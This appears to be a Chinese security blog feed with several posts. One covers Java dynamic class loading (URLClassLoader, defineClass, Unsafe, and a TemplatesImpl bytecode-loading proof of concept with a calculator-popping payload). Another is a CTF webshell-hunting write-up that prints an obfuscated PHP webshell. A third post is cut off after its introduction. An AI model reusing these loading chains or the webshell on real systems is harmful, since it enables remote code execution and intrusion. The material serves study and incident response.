<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Dog</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> staticVar;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> instanceVar;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Dog()&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;无参构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    Dog(<span class="type">int</span> instanceVar)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参构造器&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticAction</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="场景一：实例化对象"><a href="#场景一：实例化对象" class="headerlink" title="场景一：实例化对象"></a>场景一：实例化对象</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Dog</span> <span class="variable">dog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Dog</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">静态代码块</span><br><span class="line">构造代码块</span><br><span class="line">无参构造器</span><br></pre></td></tr></table></figure>

<p>所以当我们使用<code>new</code>来实例化对象的时候，会先调用静态代码块，再调用动态代码块，再根据不同的实例化方法调用不同的构造器</p>
<h5 id="场景二：调用静态方法"><a href="#场景二：调用静态方法" class="headerlink" title="场景二：调用静态方法"></a>场景二：调用静态方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Dog.staticAction();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">静态代码块</span><br><span class="line">静态方法</span><br></pre></td></tr></table></figure>

<p>所以当我们不实例化对象直接调用静态方法，会先调用类中的静态代码块，然后调用静态方法</p>
<h5 id="场景三：对类中的静态成员赋值"><a href="#场景三：对类中的静态成员赋值" class="headerlink" title="场景三：对类中的静态成员赋值"></a>场景三：对类中的静态成员赋值</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Dog.staticVar = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">静态代码块</span><br></pre></td></tr></table></figure>

<p>所以对静态成员变量赋值前，会调用静态代码块</p>
<h5 id="场景四：使用class获取类"><a href="#场景四：使用class获取类" class="headerlink" title="场景四：使用class获取类"></a>场景四：使用class获取类</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Dog.class;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>没有输出任何东西</p>
<h5 id="场景五：使用forName获取类"><a href="#场景五：使用forName获取类" class="headerlink" title="场景五：使用forName获取类"></a>场景五：使用forName获取类</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.Dog&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打印 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">静态代码块</span><br></pre></td></tr></table></figure>

<p>还有</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Class.forName(<span class="string">&quot;com.Dog&quot;</span>, <span class="literal">true</span>, ClassLoader.getSystemClassLoader());</span><br><span class="line"><span class="comment">// 打印“静态代码块”</span></span><br><span class="line">Class.forName(<span class="string">&quot;com.Dog&quot;</span>, <span class="literal">false</span>, ClassLoader.getSystemClassLoader());</span><br><span class="line"><span class="comment">// 没有打印 因为这个通过false控制只加载，没有初始化</span></span><br></pre></td></tr></table></figure>

<h4 id="利用URLClassLoader加载class文件"><a href="#利用URLClassLoader加载class文件" class="headerlink" title="利用URLClassLoader加载class文件"></a>利用URLClassLoader加载class文件</h4><p><code>URLClassLoader</code> 实际上是我们平时默认使用的 <code>AppClassLoader</code> 的父类，所以，我们解释 <code>URLClassLoader</code> 的工作过程实际上就是在解释默认的 <code>Java </code>类加载器的工作流程。</p>
<p>先新建一个calc类，注意这里没有声明Calc再哪个包，就是自由的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Calc</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>构建生成Calc.class文件，把它放在目录下</p>
<h5 id="file协议"><a href="#file协议" class="headerlink" title="file协议"></a>file协议</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">package com;</span><br><span class="line"></span><br><span class="line">import java.net.MalformedURLException;</span><br><span class="line">import java.net.URL;</span><br><span class="line">import java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line">public class URLLoader &#123;</span><br><span class="line">    public static void main(String[] args) throws MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        URLClassLoader urlClassLoader = new URLClassLoader(new URL[]&#123;new URL(&quot;file:///Users/lingtian/Downloads/&quot;)&#125;);</span><br><span class="line">        Class calc = urlClassLoader.loadClass(&quot;Calc&quot;);</span><br><span class="line">        calc.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="http协议"><a href="#http协议" class="headerlink" title="http协议"></a>http协议</h5><p>在Clac.class所在目录开一个http服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLClassLoader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLLoader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> MalformedURLException, ClassNotFoundException, InstantiationException, IllegalAccessException &#123;</span><br><span class="line">        <span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://localhost:8000/&quot;</span>)&#125;);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">calc</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        calc.newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务器这边也可以看到接收到请求</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20250214154610.png" ></p>
<h5 id="jar-file"><a href="#jar-file" class="headerlink" title="jar+file"></a>jar+file</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">jar -cvf Calc.jar Clac.class</span><br></pre></td></tr></table></figure>

<p>生成一个jar文件</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;jar:file:///Users/lingtian/Downloads/Calc.jar!/&quot;</span>)&#125;);</span><br><span class="line"><span class="type">Class</span> <span class="variable">calc</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">calc.newInstance();</span><br></pre></td></tr></table></figure>

<p>就是调用前面多一个jar:，总体逻辑是一样的，要注意包声明的位置，需要对得上</p>
<h5 id="jar-http"><a href="#jar-http" class="headerlink" title="jar+http"></a>jar+http</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">URLClassLoader</span> <span class="variable">urlClassLoader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLClassLoader</span>(<span class="keyword">new</span> <span class="title class_">URL</span>[]&#123;<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;jar:http://127.0.0.1:8000/Calc.jar!/&quot;</span>)&#125;);</span><br><span class="line"><span class="type">Class</span> <span class="variable">calc</span> <span class="operator">=</span> urlClassLoader.loadClass(<span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">calc.newInstance();</span><br></pre></td></tr></table></figure>

<h4 id="利用-ClassLoader-defineClass-直接加载字节码"><a href="#利用-ClassLoader-defineClass-直接加载字节码" class="headerlink" title="利用 ClassLoader#defineClass 直接加载字节码"></a>利用 ClassLoader#defineClass 直接加载字节码</h4><p>默认的ClassLoader#defineClass方法是native，逻辑在JVM里面的C语言</p>
<p>看一下defineclass的调用模式，name就是类名，b为字节码数组，off为偏移量，len为字节码长度</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">final</span> Class&lt;?&gt; defineClass(String name, <span class="type">byte</span>[] b, <span class="type">int</span> off, <span class="type">int</span> len)</span><br></pre></td></tr></table></figure>

<p>因为是保护的属性，无法在外部直接访问，所以我们需要反射调用<code>defineClass()</code> 方法进行字节码的加载</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLLoaderTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException &#123;</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader(); <span class="comment">// 获取系统的类加载器</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);<span class="comment">// 通过反射获取到define方法</span></span><br><span class="line">        method.setAccessible(<span class="literal">true</span>); <span class="comment">// 设置访问权限</span></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Calc.class&quot;</span>)); <span class="comment">// 获取字节码数组</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> (Class) method.invoke(classLoader, <span class="string">&quot;Calc&quot;</span>, code, <span class="number">0</span>, code.length); <span class="comment">// 按照defineclass的调用要求依次传入参数。然后加载出类给c，其实也就是Calc类</span></span><br><span class="line">        c.newInstance(); <span class="comment">// 实现实例化</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用<code>ClassLoader#defineClass</code>直接加载字节码有个优点就是不需要出网也可以加载字节码。</p>
<h4 id="利用Unsafe-加载字节码"><a href="#利用Unsafe-加载字节码" class="headerlink" title="利用Unsafe 加载字节码"></a>利用Unsafe 加载字节码</h4><p>Unsafe也有defineClass()，本质和上一个差不多</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException, InstantiationException, IllegalAccessException, NoSuchMethodException, InvocationTargetException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">ClassLoader</span> <span class="variable">classLoader</span> <span class="operator">=</span> ClassLoader.getSystemClassLoader();</span><br><span class="line"></span><br><span class="line">        Class&lt;Unsafe&gt; unsafeClass = Unsafe.class;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">unsafeField</span> <span class="operator">=</span> unsafeClass.getDeclaredField(<span class="string">&quot;theUnsafe&quot;</span>);</span><br><span class="line">        unsafeField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Unsafe</span> <span class="variable">classUnsafe</span> <span class="operator">=</span> (Unsafe) unsafeField.get(<span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Method</span> <span class="variable">defineClassMethod</span> <span class="operator">=</span> unsafeClass.getMethod(<span class="string">&quot;defineClass&quot;</span>, String.class, <span class="type">byte</span>[].class,<span class="type">int</span>.class, <span class="type">int</span>.class, ClassLoader.class, ProtectionDomain.class);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cc</span> <span class="operator">=</span> (Class) defineClassMethod.invoke(classUnsafe, <span class="string">&quot;Calc&quot;</span>, code, <span class="number">0</span>, code.length, classLoader, <span class="literal">null</span>);</span><br><span class="line">        cc.newInstance();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="TemplatesImpl加载字节码"><a href="#TemplatesImpl加载字节码" class="headerlink" title="TemplatesImpl加载字节码"></a>TemplatesImpl加载字节码</h4><h5 id="为什么要用这个"><a href="#为什么要用这个" class="headerlink" title="为什么要用这个"></a>为什么要用这个</h5><p>为什么用这个：在实际场景中，因为defineClass方法作用域却是不开放的，所以我们很很难直接利用到它，但是我们的TemplatesImpl里的作用域是default</p>
<p>目标，调用到里面的TemplatesImpl有一个内部类，TransletClassLoader，里面调用了defineClass方法（重写），而且这个内部类继承了ClassLoader，而且这个重写的defineClass方法没有写明作用域，就默认是default，所以可以被类外部调用</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/image-20241125205755573.png" ></p>
<h5 id="调用链"><a href="#调用链" class="headerlink" title="调用链"></a>调用链</h5><p>确定了目标，接下来确定一下调用链</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">TransletClassLoader#defineClass()</span><br><span class="line">	-&gt; TemplatesImpl#defineTransletClasses()</span><br><span class="line">	 -&gt; TemplatesImpl#getTransletInstance()</span><br><span class="line">	 	-&gt; TemplatesImpl#newTransformer()</span><br><span class="line">	 		-&gt; TemplatesImpl#getOutputProperties()</span><br></pre></td></tr></table></figure>

<p>倒推前面一两个属性都是private，直到newTransformer和getOutputProperties才是public</p>
<h5 id="注意点1"><a href="#注意点1" class="headerlink" title="注意点1"></a>注意点1</h5><p>这里有一个点，就是在找defineTransletClasses上一个调用方法的时候，其实是有三个</p>
<p>但是这里getTransletClasses()和 getTransletIndex() 都在调用defineTransletClasses()后没别的动作，那么最后加载的类就无法被实例化&#x2F;初始化</p>
<p>咱们getTransletInstance()在取得了_class后会对数组里面对应的队形进行<strong>无参数</strong>初始化，满足了我们的要求</p>
<h5 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h5><p>确定了调用链，先构造一个准备被调用的类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">// TemplatesImpl 的字节码构造</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesBytes</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TemplatesBytes</span><span class="params">()</span> <span class="keyword">throws</span> IOException&#123; <span class="comment">// 构造方法，每次加载类的时候会自动调用</span></span><br><span class="line">        <span class="built_in">super</span>();</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello TemplatesBytes&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里这个类需要继承<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code></p>
<p>然后因为AbstractTranslet这个类里面有一些抽象方法，所以需要重写，然后就直接写我们要做的事情，这里控制打印一下就好</p>
<p><strong>POC：</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 主程序</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TemplatesRce</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;/Users/lingtian/Downloads/TemplatesBytes.class&quot;</span>));</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;Calc&quot;</span>);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][] &#123;code&#125;);</span><br><span class="line">        setFieldValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">        templates.getOutputProperties();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>setFieldValue</code>这个好高明，直接定义一个方法调用，避免冗余，主要逻辑就是获取成员变量然后修改里面的值就好</p>
<h5 id="注意点2"><a href="#注意点2" class="headerlink" title="注意点2"></a>注意点2</h5><p>链子一开始可以是newTransformer()也可以是getOutputProperties()，因为都是public，多一个getOutputProperties去调用也没什么影响，直接newTransformer也是可以的，不用纠结这个，直接修改代码里面的这个就行</p>
<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p>b站：白日梦组长</p>
<p><a class="link"   href="https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/" >https://drun1baby.top/2022/06/03/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80%E7%AF%87-05-%E7%B1%BB%E7%9A%84%E5%8A%A8%E6%80%81%E5%8A%A0%E8%BD%BD/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://exp10it.io/2022/11/java-classloader/" >https://exp10it.io/2022/11/java-classloader/<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://xz.aliyun.com/news/8556" >https://xz.aliyun.com/news/8556<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.anquanke.com/post/id/260902" >https://www.anquanke.com/post/id/260902<i class="fas fa-external-link-alt"></i></a></p>
<p><a class="link"   href="https://www.cnblogs.com/hollischuang/p/14260801.html" >https://www.cnblogs.com/hollischuang/p/14260801.html<i class="fas fa-external-link-alt"></i></a></p>
]]></content>
      <tags>
        <tag>java</tag>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>玄机--webshell查杀</title>
    <url>/2024/05/31/%E7%8E%84%E6%9C%BA-webshell%E6%9F%A5%E6%9D%80/</url>
    <content><![CDATA[<h4 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h4><p>护网要来了，好久没写博客了（滑跪）。前段时间朋友给了个号，做一波记录一下，一些语句和工具很值得学习。</p>
<h4 id="黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx"><a href="#黑客webshell里面的flag-flag-xxxxx-xxxx-xxxx-xxxx-xxxx" class="headerlink" title="黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}"></a>黑客webshell里面的flag flag{xxxxx-xxxx-xxxx-xxxx-xxxx}</h4><p>先把html文件夹下的源码下载到本地</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tar -czvf src.tar.gz ./*</span><br></pre></td></tr></table></figure>

<p>然后用d盾查杀一下</p>
<p><img   src="https://cdn.jsdelivr.net/gh/lintian31/blog-image/blog-image/20240531225522.png" ></p>
<p>查看gz.php，看到flag</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;027ccd04-5065-48b6-a32d-77c704a5e26d&#125;</span><br></pre></td></tr></table></figure>

<h4 id="黑客使用的什么工具的shell-github地址的md5-flag-md5"><a href="#黑客使用的什么工具的shell-github地址的md5-flag-md5" class="headerlink" title="黑客使用的什么工具的shell github地址的md5 flag{md5}"></a>黑客使用的什么工具的shell github地址的md5 flag{md5}</h4><p>gz.php看的出来用的是哥斯拉的木马</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/BeichenDream/Godzilla</span><br><span class="line">md5:39392de3218c333f794befef07ac9257</span><br></pre></td></tr></table></figure>

<h4 id="黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx"><a href="#黑客隐藏shell的完整路径的md5-flag-md5-注-xxx-xxx-xxx-xxx-xxx-xxx" class="headerlink" title="黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx"></a>黑客隐藏shell的完整路径的md5 flag{md5} 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx</h4><p>D盾看到有一个.Mysqli.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/var/www/html/include/Db/.Mysqli.php</span><br><span class="line">md5:aebac0e58cd6c5fad1695ee4d1ac1919</span><br></pre></td></tr></table></figure>

<h4 id="黑客免杀马完整路径-md5-flag-md5"><a href="#黑客免杀马完整路径-md5-flag-md5" class="headerlink" title="黑客免杀马完整路径 md5 flag{md5}"></a>黑客免杀马完整路径 md5 flag{md5}</h4><p>d盾看到有一个top.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="string">&quot;password&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//ERsDHgEUC1hI</span></span><br><span class="line"><span class="variable">$fun</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;func&#x27;</span>]);</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$fun</span>);<span class="variable">$i</span>++)&#123;</span><br><span class="line">    <span class="variable">$fun</span>[<span class="variable">$i</span>] = <span class="variable">$fun</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">7</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;a&quot;</span>;</span><br><span class="line"><span class="variable">$s</span> = <span class="string">&quot;s&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>=<span class="variable">$a</span>.<span class="variable">$s</span>.<span class="variable">$_GET</span>[<span class="string">&quot;func2&quot;</span>];</span><br><span class="line"><span class="variable">$c</span>(<span class="variable">$fun</span>);</span><br></pre></td></tr></table></figure>

<p>明显有混淆和编码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">路径：/var/www/html/wap/top.php</span><br><span class="line">md5:eeff2eabfd9b7a6d26fc1a53d3f7d1de</span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>应急响应</tag>
      </tags>
  </entry>
  <entry>
    <title>sh脚本中==判断的几个情况</title>
    <url>/2024/04/23/sh%E8%84%9A%E6%9C%AC%E4%B8%AD-%E5%88%A4%E6%96%AD%E7%9A%84%E5%87%A0%E4%B8%AA%E6%83%85%E5%86%B5/</url>
    <content><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>今天看到一个脚本需要爆破密码，我在已知密码是18位的情况下，妄想写个脚本去爆破，肯定是失败的，最后看到正确的脚本，我注意到里面用到*，最开始的理解是通配符绕过去了，经过shell脚本大佬·群主老师·云淡__风轻的点拨，我了解到一个关于shell脚本的知识点，有必要写个笔记记录一下。</p>
<h4 id="进入正题"><a href="#进入正题" class="headerlink" title="进入正题"></a>进入正题</h4><h5 id="绕过"><a href="#绕过" class="headerlink" title="&#x3D;&#x3D;绕过"></a>&#x3D;&#x3D;绕过</h5><p>先看脚本</p>
